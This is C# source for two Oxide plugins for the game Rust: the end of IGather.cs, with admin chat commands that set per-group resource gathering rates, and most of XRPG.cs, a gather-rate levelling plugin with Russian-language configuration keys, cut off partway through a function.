                    groupData.groupD[1].groupPlayers.Add(target);
                    playerData.playerD[target].playerGroupName = groupData.groupD[1].groupName;
                    playerData.playerD[target].playerGroupID = groupData.groupD[1].groupID;
                    playerData.playerD[target].playerPickup = groupData.groupD[1].groupPickupRate;
                    playerData.playerD[target].playerResource = groupData.groupD[1].groupResourceRate;
                    playerData.playerD[target].playerQuarry = groupData.groupD[1].groupQuarryRate;
                    SaveData();
                }
            }  
        }

        // / // / // / //
        //Chat Commands//
        // / // / // / //   

        [ChatCommand("igath")]
        void cmdChat(BasePlayer player, string command, string[] args) 
        {     
            if(player == null) return;

            switch(args[0])
            {
                case "creategroup":
                    if(player.net.connection.authLevel > 1)
                    {
                        if(args.Length >= 5 || args.Length == 0) SendReply(player, "Syntax: igath creategroup (group name) (resource rate) (quarry rate) (pickup rate).");
                        var id = groupData.groupD.Count() + 1;
                        var name = args[1].ToString();

                        var resource = float.Parse(args[2]);
                        var quarry = float.Parse(args[3]);
                        var pickup = float.Parse(args[4]);

                        SendReply(player, lang.GetMessage("GroupCreating", this));

                        if(TryGroup())
                        {
                                if(nameli.Contains(args[1].ToString()))
                                {
                                    SendReply(player, lang.GetMessage("GroupAlreadyExists", this).Replace("{name}", name));
                                    nameli.Clear();
                                    return;
                                }
                                timer.Once(5, () =>
                                {
                                    if(nameli.Contains(args[1].ToString()))
                                    {
                                        SendReply(player, lang.GetMessage("GroupAlreadyExists", this).Replace("{name}", name));
                                        nameli.Clear();
                                        return;
                                    }
                                });
                        }

                        var info = new Groups();
                        info.groupName = name;
                        info.groupID = id;
                        info.groupPerm = "igather."+name;
                        info.groupCreater = player.displayName;
                        info.groupTimeCreated = DateTime.Now.ToString("h:mm tt").ToString();
                        info.groupPlayers = new List<ulong>();
                        info.groupResourceRate = resource;
                        info.groupQuarryRate = quarry;
                        info.groupPickupRate = pickup;
                        groupData.groupD.Add(id, info);

                        groupData.perms.Add("igather."+name);
                        SaveData();

                        SendReply(player, lang.GetMessage("GroupCreated", this).Replace("{name}", name).Replace("{id}", id.ToString()));
                        SendReply(player, lang.GetMessage("GroupCreatedStats", this).Replace("resource", resource.ToString()).Replace("quarry", quarry.ToString()).Replace("pickup", pickup.ToString()));      
                        nameli.Clear(); 
                        LoadPerms();      
                    }  
                    else
                    {
                        SendReply(player, lang.GetMessage("NoPermission", this));
                        return;
                    }
                break;

                case "collectstats":
                    if(player.net.connection.authLevel > 1)
                    {
                        if(args.Length >= 2 || args.Length == 0) SendReply(player, "Syntax: igath collectstats (User Name).");
                        object addPlayer = FindPlayer(player, args[1]);             
                        BasePlayer target = (BasePlayer)addPlayer;        
                        if(target == null) return;
                        SendReply(player, lang.GetMessage("GatherStats", this).Replace("player", target.ToString()).Replace("resource", playerData.playerD[target.userID].playerResource.ToString()).Replace("quarry", playerData.playerD[target.userID].playerQuarry.ToString()).Replace("pickup", playerData.playerD[target.userID].playerPickup.ToString()));             
                    }  
                    else
                    {
                        SendReply(player, lang.GetMessage("NoPermission", this));
                        return;
                    }
                break;

                case "wipegroups":
                    if(player.net.connection.authLevel > 1)
                    {
                        if(args.Length >= 2) SendReply(player, "Syntax: igath wipegroups.");
                        SendReply(player, lang.GetMessage("WGConfirmWipe", this));
                        WipeConfirmV = true;
                        timer.Once(60, () =>
                        {
                            if(WipeConfirmV == false) return;
                            SendReply(player, lang.GetMessage("WGTimerExpired", this));
                            WipeConfirmV = false;
                        });
                    }  
                    else
                    {
                        SendReply(player, lang.GetMessage("NoPermission", this));
                        return;
                    }
                break; 

                case "confirmwipe":
                    if(player.net.connection.authLevel != 2)
                    {
                        SendReply(player, lang.GetMessage("NoPermission", this));
                        return;           
                    }  
                    else if(WipeConfirmV == false)
                    {
                        SendReply(player, lang.GetMessage("WGInactive", this));  
                        return;
                    }
                    else
                    {
                        if(args.Length >= 2) SendReply(player, "Syntax: igath confirmwipe.");
                        WipeConfirmV = false;
                        SendReply(player, lang.GetMessage("WGWiping", this));  
                        PrintWarning(lang.GetMessage("WGWipingWarn", this).Replace("warner", player.displayName));
                        AddPlayers();
                        groupData.groupD.Clear();
                        LoadDefaultGroups();

                        foreach(var target in newadd)
                        {
                            groupData.groupD[1].groupPlayers.Add(target);
                            playerData.playerD[target].playerGroupName = groupData.groupD[1].groupName;
                            playerData.playerD[target].playerGroupID = groupData.groupD[1].groupID;
                            playerData.playerD[target].playerPickup = groupData.groupD[1].groupPickupRate;
                            playerData.playerD[target].playerResource = groupData.groupD[1].groupResourceRate;
                            playerData.playerD[target].playerQuarry = groupData.groupD[1].groupQuarryRate;
                            SaveData();
                        }
                    } 
                break;

                case "gather":
                    if(args.Length >= 2) SendReply(player, "Syntax: igath gather.");
                    SendReply(player, "Gather stats:\n Resource Rate: "+ playerData.playerD[player.userID].playerResource +"\n  Quarry Rate: "+ playerData.playerD[player.userID].playerQuarry +"\n  Pickup Rate: "+ playerData.playerD[player.userID].playerPickup);
                break;

                case "setgather":
                    if(player.net.connection.authLevel > 1)
                    {
                        var groupid = Convert.ToInt32(args[1]);
                        var resource = float.Parse(args[2]);
                        var quarry = float.Parse(args[3]);
                        var pickup = float.Parse(args[4]);    
                        if(args.Length >= 5 || args.Length == 0) SendReply(player, "Syntax: igath setgather (Group ID) (Resource Rate) (Quarry Rate) (Pickup Rate).");
                        if(!groupData.groupD.ContainsKey(groupid))
                        {
                            SendReply(player, lang.GetMessage("SGNoGroupID", this), groupid);
                            return;
                        }
                        else
                        {
                            groupData.groupD[groupid].groupResourceRate = resource;
                            groupData.groupD[groupid].groupQuarryRate = quarry;
                            groupData.groupD[groupid].groupPickupRate = pickup;
                            SaveData();
                            SendReply(player, lang.GetMessage("SGSet", this), groupData.groupD[groupid].groupName, resource, quarry, pickup);
                        }
                    }  
                    else
                    {
                        SendReply(player, lang.GetMessage("NoPermission", this));
                        return;
                    }
                break;

                default:
                   SendReply(player, "Syntax: /igath creategroup (group name) (resource rate) (quarry rate) (pickup rate)."); 
                   SendReply(player, "Syntax: /igath addusertogroup (User Name) (GroupID).");
                   SendReply(player, "Syntax: /igath removeuserfromgroup (User Name) (Group to be placed in).");
                   SendReply(player, "Syntax: /igath collectstats (User Name).");
                   SendReply(player, "Syntax: /igath wipegroups.");
                   SendReply(player, "Syntax: /igath gather.");
                   SendReply(player, "Syntax: /igath setgather (Group ID) (Resource Rate) (Quarry Rate) (Pickup Rate).");
                break;
            }
        }

        // / // / // / //
        //Config Gather//
        // / // / // / //   

        private void OnDispenserGather(ResourceDispenser dispenser, BaseEntity entity, Item item)
        {
            BasePlayer player = entity.ToPlayer();
            if(player == null) return;
            if(!playerData.playerD.ContainsKey(player.userID))
            {
                OnPlayerInit(player);  
            }            
            else
            {
                item.amount = (int)(item.amount * playerData.playerD[player.userID].playerResource);                
            }
        }

        private void OnQuarryGather(MiningQuarry quarry, Item item)
        {
            BasePlayer player = BasePlayer.FindByID(quarry.OwnerID) ?? BasePlayer.FindSleeping(quarry.OwnerID);           
            if(player == null) return; 
            try 
            {
                if(!playerData.playerD.ContainsKey(player.userID))
                {
                    OnPlayerInit(player);  
                }
                else
                {
                    item.amount = (int)(item.amount * playerData.playerD[player.userID].playerQuarry);                   
                }                  
            }
            catch(System.Exception)
            {
                return;
            }
        }

        private void OnCollectiblePickup(Item item, BasePlayer player)
        {
            if(player == null) return;   
            if(!playerData.playerD.ContainsKey(player.userID))
            {
                OnPlayerInit(player);  
            }            
            else
            {
                item.amount = (int)(item.amount * playerData.playerD[player.userID].playerPickup);                  
            }       
        }

        // / // / // / //
        //Find Name Gro//
        // / // / // / //   

        bool TryGroupSe()
        {
            if(groupData.groupD.ContainsKey(newcount))
            {
                nameli.Add(groupData.groupD[newcount].groupName.ToString());
                newcount++;
                TryGroupSe();      
                return true;      
            }
            else
            {
                if(newcount < groupData.groupD.Count)
                {
                    newcount++;
                    TryGroupSe();
                    return true;
                }
                else
                {
                    newcount = 0;
                    return true;
                }
            }
        }

        bool TryGroup()
        {
            if(TryGroupSe()) return true;
            else return true;
        }

        void AddPlayers()
        {
            if(groupData.groupD.ContainsKey(newcount))
            {
                foreach(var uid in groupData.groupD[newcount].groupPlayers)
                {
                    if(newadd.Contains(uid)) break;
                    newadd.Add(uid);
                }
                newcount++;
                AddPlayers();      
                return;    
            }
            else
            {
                if(newcount < groupData.groupD.Count)
                {
                    newcount++;
                    AddPlayers();
                    return;
                }
                else
                {
                    newcount = 0;
                    return;
                }
            }          
        }
        // / // / // / //
        //Find Player -//
        // / // / // / // 

        private BasePlayer FindPlayer(BasePlayer player, string arg)
        {
            var foundPlayers = new List<BasePlayer>();
            ulong steamid;
            ulong.TryParse(arg, out steamid);
            string lowerarg = arg.ToLower();

            foreach (var p in BasePlayer.activePlayerList)
            {
                if (p != null)
                {
                    if (steamid != 0L)
                        if (p.userID == steamid) return p;
                    string lowername = p.displayName.ToLower();
                    if (lowername.Contains(lowerarg))
                    {
                        foundPlayers.Add(p);
                    }
                }
            }
            if (foundPlayers.Count == 0)
            {
                foreach (var sleeper in BasePlayer.sleepingPlayerList)
                {
                    if (sleeper != null)
                    {
                        if (steamid != 0L)
                            if (sleeper.userID == steamid)
                            {
                                foundPlayers.Clear();
                                foundPlayers.Add(sleeper);
                             
                                return foundPlayers[0];
                            }
                        string lowername = player.displayName.ToLower();
                        if (lowername.Contains(lowerarg))
                        {
                            foundPlayers.Add(sleeper);
                        }
                    }
                }
            }
            if (foundPlayers.Count == 0)
            {
                if (player != null)
                    SendReply(player, "Could not find a player with the name of "+ arg);
                return null;
            }
            if (foundPlayers.Count > 1)
            {
                if (player != null)
                    SendReply(player, "Found "+ foundPlayers.Count + " with the name of "+ arg);
                return null;
            }

            return foundPlayers[0];
        }   

        private BasePlayer FindPlayerC(ConsoleSystem.Arg targer, string arg)
        {
            var foundPlayers = new List<BasePlayer>();
            ulong steamid;
            ulong.TryParse(arg, out steamid);
            string lowerarg = arg.ToLower();

            foreach (var p in BasePlayer.activePlayerList)
            {
                if (p != null)
                {
                    if (steamid != 0L)
                        if (p.userID == steamid) return p;
                    string lowername = p.displayName.ToLower();
                    if (lowername.Contains(lowerarg))
                    {
                        foundPlayers.Add(p);
                    }
                }
            }
            if (foundPlayers.Count == 0)
            {
                foreach (var sleeper in BasePlayer.sleepingPlayerList)
                {
                    if (sleeper != null)
                    {
                        if (steamid != 0L)
                            if (sleeper.userID == steamid)
                            {
                                foundPlayers.Clear();
                                foundPlayers.Add(sleeper);
                                return foundPlayers[0];
                            }
                        string lowername = targer.ToString();
                        if (lowername.Contains(lowerarg))
                        {
                            foundPlayers.Add(sleeper);
                        }
                    }
                }
            }
            if (foundPlayers.Count == 0)
            {
                if (arg != null)
                    SendReply(targer, "Could not find a player with the name of "+ arg);
                return null;
            }
            if (foundPlayers.Count > 1)
            {
                if (arg != null)
                    SendReply(targer, "Could not find a player with the name of "+ arg);
                return null;
            }

            return foundPlayers[0];
        }  

        private BasePlayer FindPlayerU(string arg)
        {
            var foundPlayers = new List<BasePlayer>();
            ulong steamid;
            ulong.TryParse(arg, out steamid);
            string lowerarg = arg.ToLower();

            foreach (var p in BasePlayer.activePlayerList)
            {
                if (p != null)
                {
                    if (steamid != 0L)
                        if (p.userID == steamid) return p;
                    string lowername = p.displayName.ToLower();
                    if (lowername.Contains(lowerarg))
                    {
                        foundPlayers.Add(p);
                    }
                }
            }
            if (foundPlayers.Count == 0)
            {
                foreach (var sleeper in BasePlayer.sleepingPlayerList)
                {
                    if (sleeper != null)
                    {
                        if (steamid != 0L)
                            if (sleeper.userID == steamid)
                            {
                                foundPlayers.Clear();
                                foundPlayers.Add(sleeper);
                                return foundPlayers[0];
                            }
                    }
                }
            }
            if (foundPlayers.Count == 0)
            {
                if (arg != null)
                return null;
            }
            if (foundPlayers.Count > 1)
            {
                if (arg != null)
                return null;
            }

            return foundPlayers[0];
        }        
    }
}


// --- End of file: IGather.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/XRPG.cs ---
// --- Original Local Path: XRPG.cs ---

using System;
using System.Collections.Generic;
using Oxide.Core.Plugins;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Game.Rust.Cui;
using UnityEngine;
using System.Linq;

namespace Oxide.Plugins
{
    [Info("XRPG", "Monster.", "1.0.9")]
    class XRPG : RustPlugin
    {
        #region Configuration

        private RPGConfig config;

        private class RPGConfig
        {
            internal class PanelSetting
            {
                [JsonProperty("AnchorMin")] public string AnchorMin;
                [JsonProperty("AnchorMax")] public string AnchorMax;
                [JsonProperty("OffsetMin")] public string OffsetMin;
                [JsonProperty("OffsetMax")] public string OffsetMax;                
			    [JsonProperty("Отображение прогресса: TRUE - от минимальных до максимальных рейтов | FALSE - от 0 до максимальных рейтов ")] public bool Progress;
            }

            internal class SSetting
            {
                [JsonProperty("Включить замедление прокачки | Чем больше рейты, тем медленнее прокачка")] public bool Slow;                
				[JsonProperty("Включить рпг панель")] public bool Panel;
                [JsonProperty("Включить рпг сообщения")] public bool Messages;
                [JsonProperty("Стартовый умножитель прокачки рейтов")] public float Boost;
            }

            internal class Permissions
            {
                [JsonProperty("Максимальные рейты лесоруба")] public float WoodRate;
                [JsonProperty("Максимальные рейты рудокопа")] public float OreRate;
                [JsonProperty("Максимальные рейты охотника")] public float AnimalRate;
                [JsonProperty("Множитель прокачки рейтов")] public float Boost;
            }

            internal class WoodSetting
            {
                [JsonProperty("Максимальные рейты лесоруба")] public float RateMax;
                [JsonProperty("Стартовые рейты лесоруба")] public float RateStart;
                [JsonProperty("Включить прокачку рейтов лесоруба добывая ресурсы")] public bool Bonus;
                [JsonProperty("Включить прокачку рейтов лесоруба подбирая ресурсы")] public bool Pickup;

                [JsonProperty("Ресурсы за добычу/подбор которых начислять рейты лесоруба | Ресурсы на которые будут действовать рейты лесоруба")] public Dictionary<string, float> Item = new Dictionary<string, float>();
            }

            internal class OreSetting
            {
                [JsonProperty("Максимальные рейты рудокопа")] public float RateMax;
                [JsonProperty("Стартовые рейты рудокопа")] public float RateStart;
                [JsonProperty("Включить прокачку рейтов рудокопа добывая ресурсы")] public bool Bonus;
                [JsonProperty("Включить прокачку рейтов рудокопа подбирая ресурсы")] public bool Pickup;

                [JsonProperty("Ресурсы за добычу/подбор которых начислять рейты рудокопа | Ресурсы на которые будут действовать рейты рудокопа")] public Dictionary<string, float> Item = new Dictionary<string, float>();
            }

            internal class AnimalSetting
            {
                [JsonProperty("Максимальные рейты охотника")] public float RateMax;
                [JsonProperty("Стартовые рейты охотника")] public float RateStart;
                [JsonProperty("Включить прокачку рейтов охотника добывая ресурсы")] public bool Bonus;
                [JsonProperty("Включить прокачку рейтов охотника подбирая ресурсы")] public bool Pickup;
                [JsonProperty("Включить прокачку рейтов охотника убивая животных")] public bool Kill;

                [JsonProperty("Ресурсы за добычу/подбор которых начислять рейты охотника | Ресурсы на которые будут действовать рейты охотника")] public Dictionary<string, float> Item = new Dictionary<string, float>();
                [JsonProperty("Животные за убийство которых начислять рейты охотника")] public Dictionary<string, float> Animal = new Dictionary<string, float>();
            }

            [JsonProperty("Общее")]
            public SSetting Setting = new SSetting();
            [JsonProperty("Расположение мини-панели")]
            public PanelSetting Panel = new PanelSetting();
            [JsonProperty("Настройка пермишенов")]
            public Dictionary<string, Permissions> Permisssion = new Dictionary<string, Permissions>();
            [JsonProperty("Настройка лесоруба")]
            public WoodSetting Wood = new WoodSetting();
            [JsonProperty("Настройка рудокопа")]
            public OreSetting Ore = new OreSetting();
            [JsonProperty("Настройка охотника")]
            public AnimalSetting Animal = new AnimalSetting();

            public static RPGConfig GetNewConfiguration()
            {
                return new RPGConfig
                {
                    Panel = new PanelSetting
                    {
                        AnchorMin = "1 0",
                        AnchorMax = "1 0",
                        OffsetMin = "-402 16",
                        OffsetMax = "-210 98",
						Progress = true
                    },
                    Setting = new SSetting
                    {
						Slow = false,
                        Panel = true,
                        Messages = true,
                        Boost = 1.0f
                    },
                    Permisssion = new Dictionary<string, Permissions>
                    {
                        ["xrpg.default"] = new Permissions
                        {
                            WoodRate = 12.5f,
                            OreRate = 12.5f,
                            AnimalRate = 12.5f,
                            Boost = 1.25f
                        }
                    },
                    Wood = new WoodSetting
                    {
                        RateMax = 10.0f,
                        RateStart = 2.5f,
                        Bonus = true,
                        Pickup = true,
                        Item = new Dictionary<string, float>
                        {
                            ["wood"] = 0.05f,
                            ["charcoal"] = 0.05f
                        }
                    },
                    Ore = new OreSetting
                    {
                        RateMax = 10.0f,
                        RateStart = 1.75f,
                        Bonus = true,
                        Pickup = true,
                        Item = new Dictionary<string, float>
                        { 
                            ["stones"] = 0.05f,
                            ["metal.ore"] = 0.05f,
                            ["metal.fragments"] = 0.05f,
                            ["sulfur.ore"] = 0.05f,
                            ["sulfur"] = 0.05f
                        }
                    },
                    Animal = new AnimalSetting
                    {
                        RateMax = 10.0f,
                        RateStart = 1.5f,
                        Bonus = true,
                        Pickup = true,
                        Kill = true,
                        Item = new Dictionary<string, float>
                        {
                            ["cloth"] = 0.05f,
                            ["leather"] = 0.05f,
                            ["bone.fragments"] = 0.05f,
                            ["fat.animal"] = 0.05f
                        },
                        Animal = new Dictionary<string, float>
                        {
                            ["boar"] = 0.75f,
                            ["bear"] = 0.75f,
                            ["stag"] = 0.75f,
                            ["wolf"] = 0.75f,
                            ["testridablehorse"] = 0.75f,
                            ["chicken"] = 0.75f
                        }
                    }
                };
            }
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
			
			try
			{
				config = Config.ReadObject<RPGConfig>();
			}
			catch
			{
				PrintWarning("Ошибка чтения конфигурации! Создание дефолтной конфигурации!");
				LoadDefaultConfig();
			}
			
			SaveConfig();
        }
		protected override void LoadDefaultConfig() => config = RPGConfig.GetNewConfiguration();
        protected override void SaveConfig() => Config.WriteObject(config);

        #endregion

        #region Data

        private class RPGData
        {
            [JsonProperty("Лесоруб")]
            public float Wood;
            [JsonProperty("Рудокоп")]
            public float Ore;
            [JsonProperty("Охотник")]
            public float Animal;
            [JsonProperty("Максимальные рейты лесоруба")]
            public float WoodRate;
            [JsonProperty("Максимальные рейты рудокопа")]
            public float OreRate;
            [JsonProperty("Максимальные рейты охотника")]
            public float AnimalRate;
            [JsonProperty("Множитель прокачки рейтов")]
            public float Boost;            
			[JsonProperty("Активность UI")]
            public bool ActiveUI = true;
        }

        private Dictionary<ulong, RPGData> StoredData = new Dictionary<ulong, RPGData>();

        #endregion

        #region Commands

        [ChatCommand("rank")]
        void cmdTOP(BasePlayer player) => TOP(player);        
		
		[ConsoleCommand("ui")]
        void ccmdUI(ConsoleSystem.Arg args)
		{
			BasePlayer player = args.Player();
			
			switch(args.Args[0])
			{
				case "show":
				{
					CuiHelper.DestroyUi(player, ".Show");
					StoredData[player.userID].ActiveUI = true;
					
					RPGUI(player);
					HideUI(player);
					break;
				}				
				case "hide":
				{
					CuiHelper.DestroyUi(player, ".RPG");
					CuiHelper.DestroyUi(player, ".Hide");
					StoredData[player.userID].ActiveUI = false;
					
					ShowUI(player);
					break;
				}
			}
		}

        #endregion

        #region Hooks

        private void OnServerInitialized()
        {
            PrintWarning("\n-----------------------------\n" +
            "     Author - Monster\n" +
            "     VK - vk.com/idannopol\n" +
            "     Discord - Monster#4837\n" +
            "     Config - v.2046\n" +
            "-----------------------------");

            if (Interface.Oxide.DataFileSystem.ExistsDatafile("XRPG"))
                StoredData = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, RPGData>>("XRPG");

            timer.Every(120, () => { Interface.Oxide.DataFileSystem.WriteObject("XRPG", StoredData); });

            BasePlayer.activePlayerList.ToList().ForEach(OnPlayerConnected);

            foreach (var perm in config.Permisssion)
                permission.RegisterPermission(perm.Key, this);

            permission.RegisterPermission("xrpg.use", this);
            permission.RegisterPermission("xrpg.top", this);
			
			InitializeLang();
        }

        private void Unload()
        {
            foreach (BasePlayer player in BasePlayer.activePlayerList)
			{
                CuiHelper.DestroyUi(player, ".RPG");
				CuiHelper.DestroyUi(player, ".Hide");
				CuiHelper.DestroyUi(player, ".Show");
			}

            Interface.Oxide.DataFileSystem.WriteObject("XRPG", StoredData);
        }

        void OnPlayerConnected(BasePlayer player)
        {
            if (player.IsReceivingSnapshot)
            {
                NextTick(() => OnPlayerConnected(player));
                return;
            }

            if (!StoredData.ContainsKey(player.userID))
            {
                StoredData.Add(player.userID, new RPGData());

                StoredData[player.userID].Wood = config.Wood.RateStart;
                StoredData[player.userID].Ore = config.Ore.RateStart;
                StoredData[player.userID].Animal = config.Animal.RateStart;

                StoredData[player.userID].WoodRate = config.Wood.RateMax;
                StoredData[player.userID].OreRate = config.Ore.RateMax;
                StoredData[player.userID].AnimalRate = config.Animal.RateMax;
            }

            if (config.Setting.Panel && permission.UserHasPermission(player.UserIDString, "xrpg.use"))
			{
				if (StoredData[player.userID].ActiveUI)
				{
					RPGUI(player);
				    HideUI(player);
				}
			    else
				    ShowUI(player);
			}
			if (permission.UserHasPermission(player.UserIDString, "xrpg.use"))
				MaxRate(player);
        }

        void OnDispenserBonus(ResourceDispenser dispenser, BasePlayer player, Item item)
        {
            if (dispenser == null || item == null || player == null) return;

            if (!permission.UserHasPermission(player.UserIDString, "xrpg.use")) return;

            if (config.Wood.Bonus)
                if (config.Wood.Item.ContainsKey(item.info.shortname))
				{
                        if (!(StoredData[player.userID].Wood >= StoredData[player.userID].WoodRate))
                        {
							var itemw = config.Wood.Item[item.info.shortname];
							float wrate = 0;
							
							if (config.Setting.Slow)
                                wrate = (itemw - (itemw / StoredData[player.userID].WoodRate * (int)StoredData[player.userID].Wood)) * StoredData[player.userID].Boost;
							else
								wrate = itemw * StoredData[player.userID].Boost;

                            StoredData[player.userID].Wood += wrate;

                            if (config.Setting.Panel)
								if (StoredData[player.userID].ActiveUI)
								{
                                    WoodUI(player);
                                    if (config.Setting.Messages)
                                        UPMessageWood(player, $"+ {Math.Round(wrate, 5)}");
								}
                        }
						
					item.amount = (int)Math.Round(item.amount * StoredData[player.userID].Wood, 1);
				}
            if (config.Ore.Bonus)
                if (config.Ore.Item.ContainsKey(item.info.shortname))
				{
                        if (!(StoredData[player.userID].Ore >= StoredData[player.userID].OreRate))
                        {
							var itemo = config.Ore.Item[item.info.shortname];
							float orate = 0;
							
							if (config.Setting.Slow)
                                orate = (itemo - (itemo / StoredData[player.userID].OreRate * (int)StoredData[player.userID].Ore)) * StoredData[player.userID].Boost;
							else
								orate = itemo * StoredData[player.userID].Boost;

                            StoredData[player.userID].Ore += orate;

                            if (config.Setting.Panel)
								if (StoredData[player.userID].ActiveUI)
								{
                                    OreUI(player);
                                    if (config.Setting.Messages)
                                        UPMessageOre(player, $"+ {Math.Round(orate, 5)}");
								}
                        }
						
					item.amount = (int)Math.Round(item.amount * StoredData[player.userID].Ore, 1);
				}
            if (config.Animal.Bonus)
                if (config.Animal.Item.ContainsKey(item.info.shortname))
				{
                        if (!(StoredData[player.userID].Animal >= StoredData[player.userID].AnimalRate))
                        {
							var itema = config.Animal.Item[item.info.shortname];
							float arate = 0;
							
							if (config.Setting.Slow)
                                arate = (itema - (itema / StoredData[player.userID].AnimalRate * (int)StoredData[player.userID].Animal)) * StoredData[player.userID].Boost;
							else
								arate = itema * StoredData[player.userID].Boost;

                            StoredData[player.userID].Animal += arate;

                            if (config.Setting.Panel)
								if (StoredData[player.userID].ActiveUI)
								{
                                    AnimalUI(player);
                                    if (config.Setting.Messages)
                                        UPMessageAnimal(player, $"+ {Math.Round(arate, 5)}");
								}
                        }
						
					item.amount = (int)Math.Round(item.amount * StoredData[player.userID].Animal, 1);
				}
        }

        void OnDispenserGather(ResourceDispenser dispenser, BaseEntity entity, Item item)
        {
            var player = entity.ToPlayer();

            if (dispenser == null || item == null || player == null) return;

            if (!permission.UserHasPermission(player.UserIDString, "xrpg.use")) return;

            if (config.Wood.Item.ContainsKey(item.info.shortname))
                item.amount = (int)Math.Round(item.amount * StoredData[player.userID].Wood, 1);
            if (config.Ore.Item.ContainsKey(item.info.shortname))
                item.amount = (int)Math.Round(item.amount * StoredData[player.userID].Ore, 1);
            if (config.Animal.Item.ContainsKey(item.info.shortname))
                item.amount = (int)Math.Round(item.amount * StoredData[player.userID].Animal, 1);
        }

        void OnCollectiblePickup(Item item, BasePlayer player, CollectibleEntity entity)
        {
            if (entity == null || item == null || player == null) return;

            if (!permission.UserHasPermission(player.UserIDString, "xrpg.use")) return;

            if (config.Wood.Pickup)
                if (config.Wood.Item.ContainsKey(item.info.shortname))
				{
                        if (!(StoredData[player.userID].Wood >= StoredData[player.userID].WoodRate))
                        {
							var itemw = config.Wood.Item[item.info.shortname];
							float wrate = 0;
							
							if (config.Setting.Slow)
                                wrate = (itemw - (itemw / StoredData[player.userID].WoodRate * (int)StoredData[player.userID].Wood)) * StoredData[player.userID].Boost;
							else
								wrate = itemw * StoredData[player.userID].Boost;

                            StoredData[player.userID].Wood += wrate;

                            if (config.Setting.Panel)
								if (StoredData[player.userID].ActiveUI)
								{
                                    WoodUI(player);
                                    if (config.Setting.Messages)
                                        UPMessageWood(player, $"+ {Math.Round(wrate, 5)}");
								}
                        }
						
					item.amount = (int)Math.Round(item.amount * StoredData[player.userID].Wood, 1);
				}
            if (config.Ore.Pickup)
                if (config.Ore.Item.ContainsKey(item.info.shortname))
				{
                        if (!(StoredData[player.userID].Ore >= StoredData[player.userID].OreRate))
                        {
							var itemo = config.Ore.Item[item.info.shortname];
							float orate = 0;
							
							if (config.Setting.Slow)
                                orate = (itemo - (itemo / StoredData[player.userID].OreRate * (int)StoredData[player.userID].Ore)) * StoredData[player.userID].Boost;
							else
								orate = itemo * StoredData[player.userID].Boost;

                            StoredData[player.userID].Ore += orate;

                            if (config.Setting.Panel)
								if (StoredData[player.userID].ActiveUI)
								{
                                    OreUI(player);
                                    if (config.Setting.Messages)
                                        UPMessageOre(player, $"+ {Math.Round(orate, 5)}");
								}
                        }
						
					item.amount = (int)Math.Round(item.amount * StoredData[player.userID].Ore, 1);
				}
            if (config.Animal.Pickup)
                if (config.Animal.Item.ContainsKey(item.info.shortname))
				{
                        if (!(StoredData[player.userID].Animal >= StoredData[player.userID].AnimalRate))
                        {
							var itema = config.Animal.Item[item.info.shortname];
							float arate = 0;
							
							if (config.Setting.Slow)
                                arate = (itema - (itema / StoredData[player.userID].AnimalRate * (int)StoredData[player.userID].Animal)) * StoredData[player.userID].Boost;
							else
								arate = itema * StoredData[player.userID].Boost;

                            StoredData[player.userID].Animal += arate;

                            if (config.Setting.Panel)
								if (StoredData[player.userID].ActiveUI)
								{
                                    AnimalUI(player);
                                    if (config.Setting.Messages)
                                        UPMessageAnimal(player, $"+ {Math.Round(arate, 5)}");
								}
                        }
						
					item.amount = (int)Math.Round(item.amount * StoredData[player.userID].Animal, 1);
				}
        }

        void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            if (entity == null || info == null) return;

            BasePlayer player = info?.InitiatorPlayer;

            if (player == null || player is NPCPlayer || player is HTNPlayer) return;

            if (!permission.UserHasPermission(player.UserIDString, "xrpg.use")) return;

            if (config.Animal.Kill)
            {
                if (!(StoredData[player.userID].Animal >= StoredData[player.userID].AnimalRate))
                        if (config.Animal.Animal.ContainsKey(entity.ShortPrefabName))
                        {
							var itema = config.Animal.Animal[entity.ShortPrefabName];
							float boost = 0;
							
							if (config.Setting.Slow)
                                boost = (itema - (itema / StoredData[player.userID].AnimalRate * (int)StoredData[player.userID].Animal)) * StoredData[player.userID].Boost;
							else
								boost = itema * StoredData[player.userID].Boost;

                            StoredData[player.userID].Animal += boost;

                            if (config.Setting.Panel)
								if (StoredData[player.userID].ActiveUI)
								{
                                    AnimalUI(player);
                                    if (config.Setting.Messages)
                                        UPMessageAnimal(player, $"+ {Math.Round(boost, 5)}");
								}
                        }
            }
        }

        void TOP(BasePlayer player)
        {
            if (!permission.UserHasPermission(player.UserIDString, "xrpg.top"))
            {
                SendReply(player, lang.GetMessage("NP", this, player.UserIDString));
                return;
            }

            int x = 1, y = 1, z = 1;

            SendReply(player, lang.GetMessage("WT", this, player.UserIDString));
            foreach (var i in StoredData.OrderByDescending(h => h.Value.Wood).Take(3))
            {
                var rplayer = covalence.Players.FindPlayerById(i.Key.ToString());

                SendReply(player, $"<color=orange>{x}</color>. {rplayer.Name} | {Math.Round(i.Value.Wood, 2)}");
                x++;
            }

            SendReply(player, lang.GetMessage("OT", this, player.UserIDString));
            foreach (var i in StoredData.OrderByDescending(h => h.Value.Ore).Take(3))
            {
                var rplayer = covalence.Players.FindPlayerById(i.Key.ToString());

                SendReply(player, $"<color=orange>{y}</color>. {rplayer.Name} | {Math.Round(i.Value.Ore, 2)}");
                y++;
            }

            SendReply(player, lang.GetMessage("AT", this, player.UserIDString));
            foreach (var i in StoredData.OrderByDescending(h => h.Value.Animal).Take(3))
            {
                var rplayer = covalence.Players.FindPlayerById(i.Key.ToString());

                SendReply(player, $"<color=orange>{z}</color>. {rplayer.Name} | {Math.Round(i.Value.Animal, 2)}");
                z++;
            }
        }

        void MaxRate(BasePlayer player)
        {
            float wrate = 0, orate = 0, arate = 0, boost = 0, x = 0;

            foreach (var perm in config.Permisssion)
                if (permission.UserHasPermission(player.UserIDString, perm.Key))
                {
                    wrate = perm.Value.WoodRate;
                    orate = perm.Value.OreRate;
                    arate = perm.Value.AnimalRate;
                    boost = perm.Value.Boost;

                    x++;

                    break;
                }

            if (x == 0)
            {
                if (StoredData[player.userID].Wood >= config.Wood.RateMax)
                {
                    StoredData[player.userID].Wood = config.Wood.RateMax;
                    StoredData[player.userID].WoodRate = config.Wood.RateMax;
                }
                else
                    StoredData[player.userID].WoodRate = config.Wood.RateMax;

                if (StoredData[player.userID].Ore >= config.Ore.RateMax)
                {
